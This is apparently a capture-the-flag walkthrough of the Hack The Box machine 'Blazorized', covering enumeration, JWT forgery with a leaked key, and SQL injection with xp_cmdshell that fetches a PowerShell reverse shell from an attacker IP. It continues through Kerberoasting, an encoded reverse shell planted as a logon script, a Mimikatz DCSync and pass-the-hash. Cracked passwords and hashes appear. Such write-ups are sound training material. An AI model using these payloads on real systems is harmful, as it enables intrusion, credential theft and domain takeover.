**Ping**
![[Pasted image 20240701130621.png]]

Nmap Scans
```
mapit 10.10.11.22 -v
```

Nmap Default Scan
![[Pasted image 20240701130754.png]]
So this is a Active Directory Machine

Nmap Service and Script Scan
![[Pasted image 20240701130927.png]]
![[Pasted image 20240701131116.png]]

Nmap All Port Scan
![[Pasted image 20240701131655.png]]

Nmap Script and Service scan for new port found
![[Pasted image 20240701131730.png]]
![[Pasted image 20240701131744.png]]

Added **blazorized.htb** to my hosts file
![[Pasted image 20240701131601.png]]
On Port 80 http://blazorized.htb/
![[Pasted image 20240701131427.png]]

Check for Updates
![[Pasted image 20240701131937.png]]
So we can impersonate as admin, will analyse it later

Markdown Playground
![[Pasted image 20240701132035.png]]
If we enter anything in the Raw markdown, it is reflecting in Rendered Markdown

Intresting Digital Gardens
![[Pasted image 20240701132157.png]]
Nothing here...

Misc.links
![[Pasted image 20240701132343.png]]
Nothing here as well

Now will analyse the requests using burp
![[Pasted image 20240701133137.png]]
When I click the button Check for updates, it is sending request to another host it is api.blazorized.htb, and it was same for Intresting Digital Gardens and Misc.links, so I have added api.blazorized.htb to my hosts file
![[Pasted image 20240701133358.png]]

Now it fetched some info's
![[Pasted image 20240701133117.png]]

Burp Request Response
![[Pasted image 20240701133647.png]]

Will do it in Intresting Digital Garden
![[Pasted image 20240701133712.png]]

Will check Misc.links
![[Pasted image 20240701133758.png]]

Computer Science
![[Pasted image 20240701133920.png]]

Cyber Security
![[Pasted image 20240701133948.png]]

We Found another subdomain admin.blazorized.htb using Gobuster
```
gobuster vhost --append-domain -u http://blazorized.htb -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -t 500
```
![[Pasted image 20240701140209.png]]
Though api.blazorized.htb has 404 response, we still know it is fetching data, will not add admin.blazorized.htb to our hosts file
![[Pasted image 20240701140453.png]]

We got a admin panel on http://admin.blazorized.htb/
![[Pasted image 20240701140428.png]]

Will analyse the token we got when we impersonate the admin while checking for updates
It is JWT token and the contetnts
![[Pasted image 20240701143559.png]]

Found the Secret key from 
```
JWT.jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";  
  
JWT.superAdminEmailClaimValue = "superadmin@blazorized.htb";  
JWT.postsPermissionsClaimValue = "Posts_Get_All";  
JWT.categoriesPermissionsClaimValue = "Categories_Get_All";  
JWT.superAdminRoleClaimValue = "Super_Admin";  
JWT.issuer = "http://api.blazorized.htb";  
JWT.apiAudience = "http://api.blazorized.htb";  
JWT.adminDashboardAudience = "http://admin.blazorized.htb";
```
So changed the payload in JWT, most importantly, we need the secret key to get this successful

![[Pasted image 20240701150541.png]]
Changed the timestamp, AUD and Domain, 

Updated Time stamp
```
date -d '2024-07-01 15:30:00 IST' +%s
```
![[Pasted image 20240701150647.png]]

And Added the key value as jwt and filled the value with new updated token
```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cGVyX0FkbWluIl0sImV4cCI6MTcxOTgyODAwMCwiaXNzIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiIsImF1ZCI6Imh0dHA6Ly9hZG1pbi5ibGF6b3JpemVkLmh0YiJ9.Y6Nr00S19eiqta7p_o64jnyaHlqUyr0dR5w6yZiNyVP8PampttncS6BZT7n3rwFsqojX1FKC7RgN5tfM8uvYgw
```
![[Pasted image 20240701151048.png]]

Finally into the Admin panel
![[Pasted image 20240701150738.png]]

After some enumeration found the vulnerable path to get initial foothold, it is http://admin.blazorized.htb/check-duplicate-category-name
![[Pasted image 20240701152953.png]]
The field is vulnerable to Sql Injection.

Used this query to get a Reverse Shell
```
'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1    EXEC master.dbo.xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.2/rev.ps1'')" --
```
![[Pasted image 20240701153449.png]]

I have already hosted my python web server and started Netcat listener in port 443
![[Pasted image 20240701153528.png]]
![[Pasted image 20240701153547.png]]
Got Reverse Shell

Found user.txt
```
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini, *.exe -File -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20240701165614.png]]

Will navigate to the directory and get the user flag
user.txt
![[Pasted image 20240701165821.png]]


Lets Jump to lateral Movement.....!

We are in some Intresting groups
![[Pasted image 20240701170045.png]]

Will run Sharphound to get Ad info's and analyse it
![[Pasted image 20240701183021.png]]
So We can write SPN to user RSA_4810, will do that

Writing SPN
Note: Before writing the SPN, We have to run PowerView.ps1 in the target
```
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='nonexistent/PWNED'}
```
```
Get-DomainUser -Identity rsa_4810 | get-domainspnticket -format hashcat
```

![[Pasted image 20240701183135.png]]
![[Pasted image 20240701183236.png]]

We got the Spn hash will crack it now using John or Hashcat, I have saved the hash in a file named spn.hash
```
john --wordlist=/usr/share/wordlists/rockyou.txt spn.hash
```
![[Pasted image 20240701183334.png]]

Will Check the Password is valid
```
crackmapexec smb 10.10.11.22 -u RSA_4810 -p "(Ni7856Do9854Ki05Ng0005 #)"
crackmapexec winrm 10.10.11.22 -u RSA_4810 -p "(Ni7856Do9854Ki05Ng0005 #)"
```
![[Pasted image 20240701183503.png]]

Now we can get a Shell via Evil-Winrm
```
evil-winrm -i 10.10.11.22 -u RSA_4810 -p "(Ni7856Do9854Ki05Ng0005 #)"
```
![[Pasted image 20240701183624.png]]

Our Privileges
![[Pasted image 20240701183648.png]]

But We don't have quota
```
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
```
![[Pasted image 20240701183831.png]]
So we can't add computer to the System

But We can write Script path to SSA_6010, will do that
```
echo "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\pwn.bat -Encoding ASCII
```
Then add it to script path and it should be relative path
```
Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\pwn.bat'
```

Now will wait for SSA_6010 to logon, also set up Netcat listener
![[Pasted image 20240701205225.png]]
Got the reverse Shell

After Analysing bloodhound, came to know that SSA_6010 can DCSysnc
![[Pasted image 20240701213340.png]]

Will Jump to Privilege Escalation.....!



Will DCSysnc using Mimikatz
```
./mimi.exe "lsadump::dcsync /domain:blazorized.htb /user:Administrator" exit
```
![[Pasted image 20240701213615.png]]
![[Pasted image 20240701213643.png]]

Got NTLM hash, will get a session as admin using this hash 
```
impacket-psexec -hashes 00000000000000000000000000000000:f55ed1465179ba374ec1cad05b34a5f3 administrator@10.10.11.22
```
![[Pasted image 20240701213744.png]]
I'm Admin now....!

Will get the Root flag
![[Pasted image 20240701213849.png]]



I'm Done with Blazorized.....:)
